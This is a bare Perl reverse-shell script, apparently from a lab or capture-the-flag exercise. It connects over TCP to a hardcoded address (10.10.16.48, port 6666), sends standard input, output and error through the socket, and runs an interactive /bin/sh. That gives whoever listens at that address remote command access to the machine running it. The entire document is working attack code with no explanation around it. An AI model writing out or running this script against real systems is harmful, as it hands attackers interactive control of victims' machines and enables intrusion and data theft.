#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket;

my $host = '10.10.16.48';
my $port = 6666;


my $socket = IO::Socket::INET->new(
    PeerAddr => $host,
    PeerPort => $port,
    Proto    => 'tcp'
) or die "Connection error : $!\n";


open(STDIN,  '<&', $socket);
open(STDOUT, '>&', $socket);
open(STDERR, '>&', $socket);


exec('/bin/sh -i');
